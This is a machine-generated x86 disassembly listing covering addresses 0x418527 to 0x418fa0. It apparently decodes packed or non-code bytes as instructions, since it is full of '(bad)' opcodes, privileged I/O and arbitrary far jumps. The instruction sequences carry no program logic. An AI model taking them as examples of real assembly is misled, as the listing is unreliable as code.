  418527:	fsub   QWORD PTR ds:0x5af2fdbf
  41852d:	lds    ebp,FWORD PTR [edx-0xf]
  418530:	mov    ch,0x68
  418532:	dec    eax
  418533:	test   al,0x3d
  418535:	(bad)  
  418536:	jae    0x418519
  418538:	and    eax,0x5b2e19b6
  41853d:	lds    esi,FWORD PTR [ebx-0xf]
  418540:	push   ebp
  418541:	or     esp,edi
  418543:	push   ds
  418544:	sbb    ecx,DWORD PTR [esi]
  418546:	add    cl,ch
  418548:	cmp    eax,0x3e2bc75b
  41854d:	pop    ebx
  41854e:	push   ebx
  41854f:	jb     0x418587
  418551:	fld    st(4)
  418553:	add    edx,ebp
  418555:	cs push 0x861550
  41855b:	icebp  
  41855c:	(bad)  
  41855d:	pop    ebx
  41855e:	shl    esi,0x62
  418561:	dec    edi
  418562:	or     al,0xde
  418564:	loopne 0x4185c4
  418566:	call   0xfe07c610
  41856b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  418594:	add    BYTE PTR [eax],al
  418596:	loopne 0x41855a
  418598:	(bad)  
  418599:	call   0x24cce0db
  41859e:	bound  edx,QWORD PTR [esi]
  4185a0:	push   0x1bce8b
  4185a5:	rol    DWORD PTR [eax],0x72
  4185a8:	std    
  4185a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185aa:	jbe    0x4185b2
  4185ac:	jne    0x418579
  4185ae:	(bad)  
  4185af:	fnstcw WORD PTR [ebx-0x6f]
  4185b2:	dec    ebp
  4185b3:	push   eax
  4185b4:	push   ss
  4185b5:	add    ecx,DWORD PTR [edx+0x2b]
  4185b8:	std    
  4185b9:	add    BYTE PTR [edx-0x32],bl
  4185bc:	in     eax,0x38
  4185be:	jo     0x41863f
  4185c0:	dec    BYTE PTR [ebx]
  4185c2:	xchg   edi,eax
  4185c3:	test   BYTE PTR [esi],0xc7
  4185c6:	sbb    dh,BYTE PTR [ebx-0x3]
  4185c9:	jmp    DWORD PTR [edi]
  4185cb:	pop    edx
  4185cc:	call   0xfec0b792
  4185d1:	mov    ebx,edx
  4185d3:	jge    0x41859d
  4185d5:	ret    0x5a1f
  4185d8:	push   ebx
  4185d9:	mov    esi,DWORD PTR [ebx-0x55]
  4185dc:	dec    ebp
  4185dd:	pop    eax
  4185de:	out    dx,eax
  4185df:	ja     0x4185d9
  4185e1:	inc    eax
  4185e2:	pop    ss
  4185e3:	jb     0x418654
  4185e5:	add    DWORD PTR [edi+edi*2+0x2a],edx
  4185e9:	(bad)  [eax]
  4185eb:	cmc    
  4185ec:	add    eax,0xfe7ea6e8
  4185f1:	(bad)  
  4185f2:	fcomp  QWORD PTR [ecx]
  4185f4:	push   cs
  4185f5:	test   BYTE PTR [ecx+0x5a],ch
	...
  418624:	inc    eax
  418625:	cmc    
  418626:	add    eax,0xfd57c3e8
  41862b:	(bad)  
  41862c:	fcomp  QWORD PTR [ecx]
  41862e:	je     0x418635
  418630:	ds inc esp
  418632:	std    
  418633:	jmp    DWORD PTR [edi-0x6ff38b88]
  418639:	jecxz  0x418640
  41863b:	call   0x400034
  418640:	jo     0x418625
  418642:	add    eax,0xfd5bf6e8
  418647:	dec    DWORD PTR [ecx+ebx*1-0x1083fd8c]
  41864e:	(bad)  
  41864f:	jne    0x4185f0
  418651:	jno    0x418675
  418653:	sbb    al,0xa0
  418655:	jns    0x418661
  418657:	ror    BYTE PTR [edx+0x5d],0xe9
  41865b:	arpl   WORD PTR [esi],di
  41865d:	in     eax,dx
  41865e:	xchg   edi,eax
  41865f:	pop    es
  418660:	push   esi
  418661:	push   0xc859ff00
  418666:	inc    ecx
  418667:	je     0x4186a5
  418669:	jmp    0x7531ee25
  41866e:	ret    
  41866f:	inc    DWORD PTR [eax-0x32]
  418672:	or     eax,ebp
  418674:	repnz pop ebp
  418676:	and    esi,edi
  418678:	inc    ebp
  418679:	jb     0x418612
  41867b:	add    DWORD PTR ds:0x367422f1,edx
  418681:	sbb    bl,BYTE PTR [eax]
  418683:	sbb    bl,BYTE PTR [ecx]
  418685:	push   ds
  418686:	or     eax,0xc0
	...
  4186af:	add    BYTE PTR [eax],al
  4186b1:	add    BYTE PTR [ebx+0x9332eb0],cl
  4186b7:	or     BYTE PTR [edx],cl
  4186b9:	call   0xfe641d30
  4186be:	inc    ebp
  4186bf:	jb     0x418658
  4186c1:	add    ebp,esp
  4186c3:	pushf  
  4186c4:	and    dh,BYTE PTR [esi+esi*1+0x5a]
  4186c8:	sbb    DWORD PTR [ecx+eiz*8],edx
  4186cb:	push   ebp
  4186cc:	test   edi,esi
  4186ce:	push   ds
  4186cf:	inc    ebp
  4186d0:	add    ebp,DWORD PTR [ebx]
  4186d2:	dec    cl
  4186d4:	inc    ecx
  4186d5:	jae    0x418704
  4186d7:	lar    eax,WORD PTR [eax]
  4186da:	cs mov dl,0x96
  4186dd:	or     esi,ebp
  4186df:	mov    bl,0x1
  4186e1:	add    BYTE PTR [esi],bh
  4186e3:	test   eax,0xb23dbb08
  4186e8:	add    DWORD PTR [eax],eax
  4186ea:	mov    ch,0xf1
  4186ec:	mov    esi,0x1ca7cc8
  4186f1:	push   ebp
  4186f2:	lds    edx,FWORD PTR [esi+0x4b1657b1]
  4186f8:	sbb    edi,DWORD PTR [edi]
  4186fa:	or     dl,BYTE PTR ds:[eax+eax*1+0x22a65b7d]
  418702:	jmp    0xc9b3:0x41989e56
  418709:	and    ah,BYTE PTR [eax-0x3c]
  41870c:	loop   0x418751
  41870e:	shl    BYTE PTR [eax-0x7a],cl
  418711:	cwde   
  418712:	inc    ebp
  418713:	(bad)  
  418714:	hlt    
  418715:	or     eax,DWORD PTR [eax]
	...
  41873f:	add    BYTE PTR [esi+0x68],dl
  418742:	jbe    0x418766
  418744:	inc    eax
  418745:	push   eax
  418746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418747:	cwde   
  418748:	inc    esp
  418749:	(bad)  
  41874a:	fmul   QWORD PTR [edi]
  41874c:	xor    DWORD PTR [esi-0x11],ecx
  41874f:	sub    edi,DWORD PTR ds:0xf62256c4
  418755:	cwde   
  418756:	fild   WORD PTR [ebx]
  418758:	jae    0x41872a
  41875a:	push   ebx
  41875b:	xchg   ch,bh
  41875d:	mov    esi,0x2379ba9a
  418762:	mov    edi,0xe71b071d
  418767:	sbb    ebp,DWORD PTR [edi+0x5a]
  41876a:	sub    ah,BYTE PTR [edx]
  41876c:	and    al,0xa0
  41876e:	pmaxub mm7,QWORD PTR [esp+eax*8+0x16]
  418773:	dec    edx
  418774:	jp     0x41872d
  418776:	out    0x3,eax
  418778:	ds pop ebx
  41877a:	je     0x418744
  41877c:	in     eax,0x2a
  41877e:	rdmsr  
  418780:	sub    eax,0x4285f6c4
  418785:	mov    bh,0xe7
  418787:	cwde   
  418788:	push   ecx
  418789:	(bad)  
  41878a:	sub    al,0x30
  41878c:	add    DWORD PTR [ebx-0x3c570739],esi
  418792:	push   0xffffff9f
  418794:	xchg   ebp,eax
  418795:	pop    edx
  418796:	push   esp
  418797:	or     ecx,ebx
  418799:	sbb    eax,0xa999b4d3
  41879e:	shl    DWORD PTR [eax],cl
  4187a0:	mov    bh,dl
  4187a2:	add    BYTE PTR [eax+eax*1],dh
	...
  4187cd:	add    BYTE PTR [esi-0x3c],cl
  4187d0:	push   cs
  4187d1:	gs int3 
  4187d3:	ret    
  4187d4:	std    
  4187d5:	jmp    0x3a31a69a
  4187da:	pop    ds
  4187db:	dec    edi
  4187dc:	in     al,dx
  4187dd:	sbb    DWORD PTR [ecx-0x3c71023c],0xb0fbffcb
  4187e7:	add    al,0x63
  4187e9:	es jge 0x4187af
  4187ec:	jmp    0x3de3:0xe41ef710
  4187f3:	pop    ebx
  4187f4:	add    BYTE PTR [esi],ch
  4187f6:	stc    
  4187f7:	mov    edx,0x5b3de900
  4187fc:	mov    ebp,DWORD PTR [ebp+edx*2+0x69d4fd12]
  418803:	sub    eax,ebp
  418805:	aad    0xfb
  418807:	sar    ebp,0xf2
  41880a:	jge    0x41885a
  41880c:	adc    BYTE PTR [edx-0x5f],ch
  41880f:	mov    edx,0xc24bb500
  418814:	jae    0x418827
  418816:	and    dh,BYTE PTR [ecx-0x5]
  418819:	push   ds
  41881a:	pop    ds
  41881b:	aad    0xd8
  41881d:	push   ss
  41881e:	leave  
  41881f:	mov    edx,0xc1d676e8
  418824:	std    
  418825:	repnz adc al,BYTE PTR [edi+0x13]
  418829:	push   0xffffffa9
  41882b:	mov    esi,0xc22e7d00
  418830:	dec    ebx
  418831:	add    eax,0x0
	...
  41885a:	add    BYTE PTR [eax],al
  41885c:	jmp    0xd7b3:0x3de911da
  418863:	icebp  
  418864:	cmp    eax,0x529ee95b
  418869:	pop    ebx
  41886a:	inc    ebp
  41886b:	imul   ebx,DWORD PTR [esi+0x7d0074c2],0x973f7d93
  418875:	jmp    0xb9b:0xeaac0b01
  41887c:	int3   
  41887d:	jmp    0xf044:0xd1776a0d
  418884:	daa    
  418885:	out    dx,eax
  418886:	lahf   
  418887:	jae    0x41889f
  418889:	push   edi
  41888a:	call   0xfebd06ec
  41888f:	call   DWORD PTR [edx+0x72]
  418892:	in     eax,0x50
  418894:	jae    0x418911
  418896:	dec    BYTE PTR [ebx-0x36a5646c]
  41889c:	in     al,0x8
  41889e:	mov    ebp,esp
  4188a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188a1:	sbb    bl,BYTE PTR [ebp+0x567b88fe]
  4188a7:	push   esi
  4188a8:	out    0x5,eax
  4188aa:	data16 in al,dx
  4188ac:	ins    BYTE PTR es:[edi],dx
  4188ad:	sahf   
  4188ae:	std    
  4188af:	not    ebp
  4188b1:	pop    esp
  4188b2:	sar    edi,0x88
  4188b5:	xor    BYTE PTR [esi+0x41],al
  4188b8:	pop    ss
  4188b9:	fidivr WORD PTR [esi]
  4188bb:	add    BYTE PTR [eax],bl
  4188bd:	fcmove st,st(2)
  4188bf:	add    DWORD PTR [eax],eax
	...
  4188e9:	add    bh,ah
  4188eb:	pop    ebp
  4188ec:	mov    eax,DWORD PTR [ebp-0x183ad]
  4188f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f3:	add    ah,dh
  4188f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f6:	or     BYTE PTR [ebx-0x2],bh
  4188f9:	or     esp,DWORD PTR [edi]
  4188fb:	imul   eax,DWORD PTR [esp+eiz*4-0x7cffa22a],0xa
  418903:	push   0xfffffffb
  418905:	jmp    FWORD PTR [eax+0x30840d5c]
  41890b:	pop    eax
  41890c:	add    BYTE PTR [eax],al
  41890e:	sbb    dl,ah
  418910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418911:	(bad)  
  418912:	ds test eax,0xe6994f1d
  418918:	sbb    ch,bh
  41891a:	xchg   ecx,eax
  41891b:	cwde   
  41891c:	sub    al,0x41
  41891e:	and    eax,0x882a1e01
  418923:	cmp    dl,BYTE PTR [edi-0x5d]
  418926:	js     0x418918
  418928:	sbb    eax,0xea229ea
  41892d:	mov    dh,0xc2
  41892f:	xchg   ecx,eax
  418930:	imul   edi,ebp,0x67b4e861
  418936:	and    BYTE PTR [ebx+eax*8-0x1],0xc2
  41893b:	cs inc edx
  41893d:	std    
  41893e:	dec    ecx
  41893f:	inc    eax
  418940:	mov    ah,0xe7
  418942:	fnstcw WORD PTR [ebx-0x942ffff]
  418948:	adc    BYTE PTR [ebp-0x1e18b45],cl
	...
  418976:	add    BYTE PTR [eax],al
  418978:	sub    DWORD PTR [ebx],eax
  41897a:	pop    ds
  41897b:	mov    ah,0xda
  41897d:	sub    BYTE PTR ds:0xe45e26fe,bl
  418983:	(bad)  
  418984:	adc    DWORD PTR [edi+eax*4-0x5d],ecx
  418988:	or     BYTE PTR [edx-0x7742bae3],al
  41898e:	hlt    
  41898f:	jno    0x418993
  418991:	jb     0x4189ea
  418993:	repz lock jns 0x4189b4
  418997:	out    0x14,eax
  418999:	enter  0xfe1e,0xf9
  41899d:	das    
  41899e:	pop    esp
  41899f:	std    
  4189a0:	fst    DWORD PTR [ecx+0x4]
  4189a3:	add    BYTE PTR [esi],bh
  4189a5:	mov    dl,0xa7
  4189a7:	add    DWORD PTR [ebx-0x3e02a3c9],edi
  4189ad:	leave  
  4189ae:	mov    cl,0xfe
  4189b0:	repz (bad) 
  4189b2:	sbb    edi,esi
  4189b4:	mov    cl,0x5b
  4189b6:	iret   
  4189b7:	(bad)  
  4189b8:	dec    ebp
  4189b9:	rcr    dh,0xa
  4189bc:	jle    0x418a0e
  4189be:	imul   ebx,DWORD PTR [ebx],0xffffff99
  4189c1:	shl    bh,0x84
  4189c4:	rol    BYTE PTR [ebx],cl
  4189c6:	(bad)  
  4189c7:	push   ds
  4189c8:	mov    BYTE PTR [esi],cl
  4189ca:	and    DWORD PTR [esi+edi*1],eax
  4189cd:	push   eax
  4189ce:	ins    BYTE PTR es:[edi],dx
  4189cf:	sub    edi,DWORD PTR [ecx-0x40]
  4189d2:	out    0x90,eax
  4189d4:	mov    edx,0x681ea5c4
  4189d9:	sub    ecx,DWORD PTR [edi]
  4189db:	or     BYTE PTR [eax],al
	...
  418a05:	add    BYTE PTR [edi],bh
  418a07:	pop    ebx
  418a08:	out    0x2b,eax
  418a0a:	inc    edi
  418a0b:	pop    eax
  418a0c:	out    0x3,eax
  418a0e:	inc    ebp
  418a0f:	fwait
  418a10:	test   BYTE PTR [edi+0x3e75b78],0x3
  418a17:	push   edi
  418a18:	call   0x6691c820
  418a1d:	inc    edi
  418a1e:	xor    eax,eax
  418a20:	out    0x2b,eax
  418a22:	int    0x57
  418a24:	out    0x3,eax
  418a26:	mov    ?,WORD PTR [ebx]
  418a28:	xchg   esi,eax
  418a29:	xchg   edx,eax
  418a2a:	jle    0x418a87
  418a2c:	pop    esp
  418a2d:	mov    bh,bh
  418a2f:	rol    BYTE PTR [esi+0x1e],0x79
  418a33:	mov    bl,0x31
  418a35:	push   es
  418a36:	ds pop ebx
  418a38:	push   0x47
  418a3a:	inc    ebp
  418a3b:	xor    eax,0xc3ba90e7
  418a40:	and    eax,0xf2ae81e
  418a45:	cmp    BYTE PTR [ebx],bh
  418a47:	pop    ebx
  418a48:	out    0x90,eax
  418a4a:	ret    0xdc3
  418a4d:	push   ds
  418a4e:	shr    BYTE PTR [edx],1
  418a50:	mov    cr4,ebx
  418a53:	sar    dh,0x9
  418a56:	inc    BYTE PTR [ebp+0x0]
  418a59:	leave  
  418a5a:	in     eax,0xd5
  418a5c:	dec    eax
  418a5d:	test   al,0x3d
  418a5f:	into   
  418a60:	and    edx,0x48
  418a63:	sar    ebp,0x39
  418a66:	push   edx
  418a67:	pop    edi
  418a68:	sbb    eax,0xd6
	...
  418a91:	add    BYTE PTR [eax],al
  418a93:	add    BYTE PTR [ebx],bh
  418a95:	iret   
  418a96:	xchg   ebx,eax
  418a97:	stos   DWORD PTR es:[edi],eax
  418a98:	xor    cl,al
  418a9a:	std    
  418a9b:	sbb    edx,edx
  418a9d:	mov    bh,0x64
  418a9f:	fisub  WORD PTR [edx]
  418aa1:	shr    ecx,0xda
  418aa4:	enter  0xc2d6,0xaf
  418aa8:	push   ebx
  418aa9:	rcl    DWORD PTR [eax+0x74],0xc1
  418aad:	(bad)  
  418aae:	(bad)  
  418aaf:	sahf   
  418ab0:	inc    ebx
  418ab1:	adc    al,ch
  418ab3:	xchg   edx,eax
  418ab4:	pop    eax
  418ab5:	sar    ch,0x60
  418ab8:	mov    ecx,0x2b86ff03
  418abd:	shl    DWORD PTR [ebx-0x23edfc3],0x76
  418ac4:	xchg   ecx,eax
  418ac5:	retf   0x6efe
  418ac8:	push   ebx
  418ac9:	mov    dh,0xf0
  418acb:	dec    DWORD PTR [edx-0x43]
  418ace:	or     DWORD PTR [ecx],ebp
  418ad0:	(bad)  
  418ad1:	mov    DWORD PTR [eax+0x22],ebp
  418ad4:	scas   eax,DWORD PTR es:[edi]
  418ad5:	sbb    eax,DWORD PTR [eax]
  418ad7:	inc    ecx
  418ad8:	inc    ecx
  418ad9:	push   ebp
  418ada:	add    cl,ch
  418adc:	int    0x36
  418ade:	leave  
  418adf:	mov    edx,0x7cfebefc
  418ae4:	data16 sar ch,0x2e
  418ae8:	and    dh,ah
  418aea:	and    eax,0xff344b26
  418aef:	xchg   edx,eax
  418af0:	cmp    eax,0x71160031
  418af5:	add    bh,bh
  418af7:	push   cs
	...
  418b20:	add    BYTE PTR [eax],al
  418b22:	xor    esi,DWORD PTR [esi]
  418b24:	mov    ds:0xfd998f00,eax
  418b29:	imul   edx,edi,0xa7076d72
  418b2f:	pop    edx
  418b30:	std    
  418b31:	mov    ch,0x63
  418b33:	pop    ebp
  418b34:	(bad)  
  418b35:	dec    DWORD PTR [edi-0x7f00e6a5]
  418b3b:	pop    edi
  418b3c:	mov    ah,0xa4
  418b3e:	jno    0x418b9f
  418b40:	(bad)  
  418b41:	call   0x404fb5
  418b46:	and    BYTE PTR ds:0x5fc0fef1,0xe5
  418b4d:	ins    BYTE PTR es:[edi],dx
  418b4e:	xchg   ebp,eax
  418b4f:	pop    edi
  418b50:	(bad)  
  418b51:	cld    
  418b52:	je     0x418b6e
  418b54:	mov    eax,0xfe5fa0ff
  418b59:	repnz icebp 
  418b5b:	mov    eax,ds:0xa4ea0f06
  418b60:	sti    
  418b61:	inc    eax
  418b63:	add    BYTE PTR [edi-0x37],bl
  418b66:	xchg   esp,eax
  418b67:	add    eax,0x15d4ec8b
  418b6c:	in     eax,dx
  418b6d:	push   eax
  418b6e:	dec    edi
  418b6f:	out    dx,eax
  418b70:	(bad)  
  418b72:	addr16 push edi
  418b74:	clc    
  418b75:	jb     0x418b8d
  418b77:	sbb    edi,esi
  418b79:	mov    esp,DWORD PTR [ebp+0x4a]
  418b7c:	gs add eax,0xe8005a26
  418b82:	xor    ah,al
  418b84:	(bad)  
  418b85:	inc    DWORD PTR [eax]
	...
  418baf:	add    BYTE PTR [edi-0x2d],ah
  418bb2:	iret   
  418bb3:	nop
  418bb4:	mov    ss,WORD PTR [ebp-0x73a36f07]
  418bba:	lea    ebp,[eax-0x26]
  418bbd:	pop    eax
  418bbe:	add    BYTE PTR [eax],al
  418bc0:	dec    edi
  418bc1:	and    al,0x17
  418bc3:	inc    DWORD PTR [eax+0x4a]
  418bc6:	mov    dl,dl
  418bc8:	ds cmp eax,esi
  418bcb:	out    dx,eax
  418bcc:	scas   al,BYTE PTR es:[edi]
  418bcd:	fild   DWORD PTR [esi]
  418bcf:	add    DWORD PTR [esi],edi
  418bd1:	mov    ah,0x29
  418bd3:	test   al,0x24
  418bd5:	mov    ebp,0x238c8a19
  418bda:	mov    cl,dl
  418bdc:	(bad)  
  418bdd:	neg    BYTE PTR [ecx]
  418bdf:	mov    cl,BYTE PTR [eax+ecx*2-0x47e970ca]
  418be6:	add    al,0x0
  418be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bea:	(bad)  
  418beb:	sti    
  418bec:	and    al,0xb4
  418bee:	sub    DWORD PTR [ebx+0x40],edx
  418bf1:	mov    ah,0x1
  418bf3:	nop
  418bf4:	mov    ch,0xe1
  418bf6:	(bad)  
  418bf7:	sar    DWORD PTR [ecx+0x7e],1
  418bfa:	adc    al,0x67
  418bfc:	cmp    dh,BYTE PTR [ebx+0x3f560001]
  418c02:	(bad)  
  418c03:	(bad)  
  418c04:	ds leave 
  418c06:	inc    ecx
  418c07:	jae    0x418c37
  418c09:	cmp    DWORD PTR [esi],esi
  418c0b:	(bad)  
  418c0c:	out    0xed,al
  418c0e:	xchg   ebp,eax
  418c0f:	inc    eax
  418c10:	ds aad 0x8f
  418c13:	out    dx,eax
	...
  418c3c:	add    BYTE PTR [eax],al
  418c3e:	push   esi
  418c3f:	mov    edi,edi
  418c41:	(bad)  
  418c42:	cmp    DWORD PTR ds:[esi],esi
  418c45:	imul   edi,DWORD PTR [esi],0x3c6a0458
  418c4b:	test   al,0x1
  418c4d:	push   0x3d
  418c4f:	stos   BYTE PTR es:[edi],al
  418c50:	add    DWORD PTR [eax],eax
  418c52:	ds jb  0x418c6e
  418c55:	je     0x418c65
  418c57:	sbb    ecx,DWORD PTR [edi]
  418c59:	add    edi,DWORD PTR [esi]
  418c5b:	mov    dl,0x8c
  418c5d:	inc    esp
  418c5e:	or     dh,bl
  418c60:	push   cs
  418c61:	shl    BYTE PTR [ebx-0x12],0x1a
  418c65:	je     0x418c59
  418c67:	ins    DWORD PTR es:[edi],dx
  418c68:	(bad)  
  418c69:	out    dx,eax
  418c6a:	(bad)  
  418c6b:	pop    ebx
  418c6c:	inc    DWORD PTR [eax]
  418c6e:	ds pop ebx
  418c70:	xchg   ecx,eax
  418c71:	mov    bh,0x67
  418c73:	pop    ebx
  418c74:	push   ss
  418c75:	xchg   ecx,eax
  418c76:	loope  0x418c2b
  418c78:	jns    0x418c7c
  418c7a:	ds pop ebx
  418c7c:	repnz inc ebx
  418c7e:	dec    ebp
  418c7f:	dec    edi
  418c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c81:	stos   DWORD PTR es:[edi],eax
  418c82:	fwait
  418c83:	dec    eax
  418c84:	test   al,0x3
  418c86:	push   cs
  418c87:	mov    bl,0xeb
  418c89:	jmp    FWORD PTR [ecx+0x140451bc]
  418c8f:	pop    ebx
  418c90:	push   ecx
  418c91:	push   es
  418c92:	and    al,0x5b
  418c94:	inc    ecx
  418c95:	pop    es
  418c96:	es pop ebx
  418c98:	out    0x3,eax
  418c9a:	jle    0x418c58
  418c9c:	cmp    al,0x14
  418c9e:	cdq    
  418c9f:	in     al,dx
  418ca0:	jecxz  0x418ca5
	...
  418cca:	add    BYTE PTR [eax],al
  418ccc:	shr    BYTE PTR ds:[eax+edx*1],cl
  418cd0:	xor    DWORD PTR [edi+0x42],eax
  418cd3:	lods   al,BYTE PTR ds:[esi]
  418cd4:	pusha  
  418cd5:	dec    eax
  418cd6:	sub    BYTE PTR [esi+edx*2],al
  418cd9:	add    al,0xe4
  418cdb:	add    edi,DWORD PTR [esi]
  418cdd:	sub    edi,edi
  418cdf:	and    cl,ah
  418ce1:	sbb    edi,esp
  418ce3:	sbb    dl,dl
  418ce5:	(bad)  
  418ce6:	(bad)  
  418ce7:	fsubr  DWORD PTR [edx]
  418ce9:	mov    esp,0x4638b37e
  418cee:	jnp    0x418d1b
  418cf0:	int    0x56
  418cf2:	out    0x3,eax
  418cf4:	xchg   BYTE PTR [eax+0x27],dl
  418cf7:	nop
  418cf8:	aas    
  418cf9:	mov    al,0xaa
  418cfb:	sbb    dl,BYTE PTR [edx-0x72294041]
  418d01:	sbb    ah,bh
  418d03:	sbb    dl,BYTE PTR [edx+0x3a484fc3]
  418d09:	pop    ebx
  418d0a:	out    0x86,eax
  418d0c:	std    
  418d0d:	dec    esi
  418d0e:	add    cl,al
  418d10:	adc    al,0x48
  418d12:	aas    
  418d13:	jmp    0xe9461f2d
  418d18:	cmp    eax,0xe395c050
  418d1d:	xor    edx,eax
  418d1f:	call   0x5882:0x14dbbfa
  418d26:	add    cl,ch
  418d28:	xor    BYTE PTR [ebx-0x4414258c],bl
  418d2e:	addr16 jmp 0x418d34
	...
  418d58:	add    BYTE PTR [eax],al
  418d5a:	push   esp
  418d5b:	inc    edi
  418d5c:	clc    
  418d5d:	out    dx,al
  418d5e:	mov    ecx,0x728c68ab
  418d63:	sbb    al,BYTE PTR [eax]
  418d65:	push   ebx
  418d66:	inc    edx
  418d67:	mov    esp,0xbfc1d6d0
  418d6c:	call   0xfdfe12c2
  418d71:	(bad)  
  418d72:	mov    cl,0xab
  418d74:	call   0xfdfe02b2
  418d79:	mov    dh,0xc1
  418d7b:	ret    
  418d7c:	call   0xfdfdf2c2
  418d81:	mov    al,0xfb
  418d83:	mov    DWORD PTR es:[ebp+0x3ae097c3],ecx
  418d8a:	mov    ah,BYTE PTR [ebx]
  418d8c:	push   0x7c271c
  418d91:	sub    DWORD PTR [eax-0x3c813ea6],0xfd223877
  418d9b:	mov    edx,0xde34f5fd
  418da0:	cmp    ebx,DWORD PTR ds:0xe9001bf3
  418da6:	enter  0x295f,0x29
  418daa:	shl    DWORD PTR [ebx-0x4936d93f],cl
  418db0:	add    BYTE PTR [eax],al
  418db2:	pop    ss
  418db3:	pop    edi
  418db4:	add    bh,al
  418db6:	mov    ds:0xe7fffd56,al
  418dbb:	pop    esi
  418dbc:	lds    eax,FWORD PTR [ebp+0x0]
	...
  418de7:	add    BYTE PTR [ebx],ch
  418de9:	pop    edi
  418dea:	add    BYTE PTR [eax],al
  418dec:	xlat   BYTE PTR ds:[ebx]
  418ded:	sbb    eax,DWORD PTR [esp+esi*8-0x19]
  418df1:	pop    esi
  418df2:	add    BYTE PTR [eax],al
  418df4:	and    dl,bh
  418df6:	in     eax,dx
  418df7:	add    bh,dl
  418df9:	pop    esi
  418dfa:	add    BYTE PTR [ebp-0x72b2b16e],cl
  418e00:	loop   0x418e6c
  418e02:	dec    ebp
  418e03:	(bad)  
  418e04:	loop   0x418d88
  418e06:	dec    ebp
  418e07:	push   0xffffff98
  418e09:	loope  0x418e4f
  418e0b:	cld    
  418e0c:	or     DWORD PTR [bx+si],eax
  418e0f:	push   0xffffffa4
  418e11:	or     dh,bh
  418e13:	(bad)  
  418e14:	xchg   edx,eax
  418e15:	xchg   esi,eax
  418e16:	dec    edx
  418e17:	inc    ecx
  418e18:	xchg   edi,eax
  418e19:	in     eax,0x44
  418e1b:	call   0x1275f34
  418e20:	xor    esp,DWORD PTR [esi+0x7f]
  418e23:	jge    0x418ea4
  418e25:	mov    ch,bh
  418e27:	call   DWORD PTR [edi-0x17]
  418e2a:	jno    0x418e2b
  418e2c:	inc    edx
  418e2d:	push   ebx
  418e2e:	mov    es,WORD PTR [ebp-0x61]
  418e31:	fistp  QWORD PTR [eax+edi*8+0x67]
  418e35:	jmp    0x3fea:0x571a8b57
  418e3c:	mov    eax,0x6e865cf
  418e41:	(bad)  
  418e44:	sahf   
  418e45:	stc    
  418e46:	(bad)  
  418e48:	in     al,0x85
  418e4a:	push   ss
  418e4b:	sub    DWORD PTR [eax],eax
	...
  418e75:	add    BYTE PTR [eax-0xc3ff5ad],bl
  418e7b:	mov    esi,0x283e4588
  418e80:	stos   DWORD PTR es:[edi],eax
  418e81:	or     edx,DWORD PTR [esi]
  418e83:	pop    ecx
  418e84:	stc    
  418e85:	inc    BYTE PTR [ecx]
  418e87:	and    DWORD PTR [esi+0xa03c9df],ecx
  418e8d:	jmp    FWORD PTR [ebx+0x28]
  418e90:	mov    BYTE PTR [edi],bh
  418e92:	inc    edx
  418e93:	mov    esi,ecx
  418e95:	cdq    
  418e96:	ins    DWORD PTR es:[edi],dx
  418e97:	add    eax,DWORD PTR [edx]
  418e99:	(bad)  
  418e9a:	ds and eax,0xc47f727b
  418ea0:	test   dl,al
  418ea2:	push   edx
  418ea3:	imul   eax,esi,0x25debdeb
  418ea9:	push   DWORD PTR [edx]
  418eab:	sbb    eax,0xb0b27418
  418eb0:	jmp    0x418ee5
  418eb2:	cmc    
  418eb3:	add    al,BYTE PTR [edx]
  418eb5:	(bad)  
  418eb6:	sti    
  418eb7:	mov    edi,0xc43e0004
  418ebc:	test   BYTE PTR [esi+eiz*4-0x63],bh
  418ec0:	add    al,0x0
  418ec2:	ds ud0 ebp,eax
  418ec6:	loop   0x418e68
  418ec8:	adc    eax,0x1876bdfe
  418ecd:	(bad)  
  418ece:	in     eax,dx
  418ecf:	mov    edx,0x86a7416
  418ed4:	lock xor esi,ebp
  418ed7:	add    BYTE PTR [eax+edi*4],0x0
	...
  418f03:	add    BYTE PTR [edi],bh
  418f05:	les    eax,FWORD PTR [ecx]
  418f07:	add    ch,dh
  418f09:	cli    
  418f0a:	inc    ecx
  418f0b:	push   esp
  418f0c:	mov    ch,0x37
  418f0e:	add    ebx,0x4fad546a
  418f14:	xchg   esi,eax
  418f15:	dec    edx
  418f16:	scas   al,BYTE PTR es:[edi]
  418f17:	(bad)  
  418f18:	jle    0x418edc
  418f1a:	sbb    DWORD PTR [ecx+0x3f],esi
  418f1d:	add    eax,0x5b638216
  418f22:	ror    edx,cl
  418f24:	jle    0x418f81
  418f26:	out    0x8f,eax
  418f28:	inc    esi
  418f29:	fcom   QWORD PTR [esp+ebx*4]
  418f2c:	je     0x418f48
  418f2e:	out    0x3,eax
  418f30:	mov    esp,DWORD PTR [ecx+0x12]
  418f33:	inc    esp
  418f34:	cwde   
  418f35:	adc    al,0x30
  418f37:	inc    ebx
  418f38:	les    edx,FWORD PTR [esi+0x51]
  418f3b:	xchg   ebx,eax
  418f3c:	jle    0x418f99
  418f3e:	inc    eax
  418f3f:	jne    0x418f7f
  418f41:	pop    ebx
  418f42:	out    0x2b,eax
  418f44:	lods   al,BYTE PTR ds:[esi]
  418f45:	sbb    BYTE PTR [esi],0x17
  418f48:	mov    esp,0x7e937576
  418f4d:	pop    ebx
  418f4e:	out    0x8f,eax
  418f50:	sub    BYTE PTR [eax+0x6eb8ff7a],bh
  418f56:	pop    ebp
  418f57:	xchg   ebx,eax
  418f58:	(bad)  
  418f59:	pop    edx
  418f5a:	inc    DWORD PTR [edx+0xae75b3c]
  418f60:	jle    0x418f90
  418f62:	in     al,dx
  418f63:	sub    al,0x27
  418f65:	pop    edx
  418f66:	out    0x3,eax
	...
  418f90:	add    BYTE PTR [eax],al
  418f92:	jns    0x418fb2
  418f94:	rol    DWORD PTR [ebx],cl
  418f96:	ds pop ebx
  418f98:	out    0x88,eax
  418f9a:	cli    
  418f9b:	mov    dh,0x17
  418f9d:	stos   BYTE PTR es:[edi],al
  418f9e:	jns    0x418fe2
  418fa0:	jmp    0x41a07bbb
